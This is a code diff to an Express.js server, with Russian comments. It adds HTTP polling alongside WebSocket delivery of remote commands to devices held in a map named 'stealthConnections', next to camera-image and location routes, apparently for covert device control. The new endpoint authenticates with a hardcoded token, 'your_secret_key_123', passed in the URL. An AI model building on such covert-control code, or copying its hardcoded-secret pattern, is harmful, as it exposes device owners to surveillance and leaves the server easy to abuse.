@@ -169,40 +169,61 @@ app.post("/api/login", (req, res) => {
   return res.status(401).json({ success: false, error: "Invalid credentials" });
 });
 
+app.get('/api/device/:deviceId/command/:token', (req, res) => {
+  const { deviceId, token } = req.params;
+  
+  if (token !== 'your_secret_key_123') {
+    return res.status(403).json({ error: "Forbidden" });
+  }
+  
+  const command = deviceCommands.get(deviceId);
+  
+  if (command && (Date.now() - command.timestamp) < 30000) {
+    console.log(`Delivering command to ${deviceId}: ${command.action}`);
+    deviceCommands.delete(deviceId);
+    return res.json({ 
+      action: command.action, 
+      timestamp: command.timestamp 
+    });
+  }
+  
+  return res.json({ action: null });
+});
+
 app.post("/api/device/command", (req, res) => {
   const { device_id, command, token } = req.body;
   
   console.log(`=== COMMAND REQUEST ===`);
   console.log(`Device ID: ${device_id}`);
   console.log(`Command: ${command}`);
-  console.log(`Active connections:`, Array.from(stealthConnections.keys()));
   
   if (token !== SECRET_TOKEN) {
     return res.status(403).json({ error: "Forbidden" });
   }
-
-  const entry = stealthConnections.get(device_id);
   
+  // Сохраняем для HTTP polling
+  deviceCommands.set(device_id, {
+    action: command.toLowerCase(),
+    timestamp: Date.now()
+  });
+  
+  console.log(`✓ Command queued for HTTP polling`);
+  
+  // Также пробуем WebSocket
+  const entry = stealthConnections.get(device_id);
   if (entry && entry.ws && entry.ws.readyState === WebSocket.OPEN) {
     try {
-      // ИЗМЕНЕНО: отправляем в правильном формате
-      const commandPayload = JSON.stringify({ 
-        action: command.toLowerCase(), // команды в lowercase
+      entry.ws.send(JSON.stringify({ 
+        action: command.toLowerCase(), 
         timestamp: Date.now() 
-      });
-      
-      console.log(`Sending to device:`, commandPayload);
-      entry.ws.send(commandPayload);
-      
-      return res.json({ success: true, command_sent: command });
+      }));
+      console.log(`✓ Also sent via WebSocket`);
     } catch (err) {
-      console.error("Error sending command:", err);
-      return res.status(500).json({ error: "Failed to send command" });
+      console.error("WebSocket send failed:", err);
     }
-  } else {
-    console.log(`Device ${device_id} not connected or WebSocket not ready`);
-    return res.status(404).json({ error: "Device not connected" });
   }
+  
+  return res.json({ success: true, method: 'http_polling' });
 });
 
 app.post("/api/camera/image", (req, res) => {
@@ -412,5 +433,6 @@ function getDistance(lat1, lon1, lat2, lon2) {
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
 
 
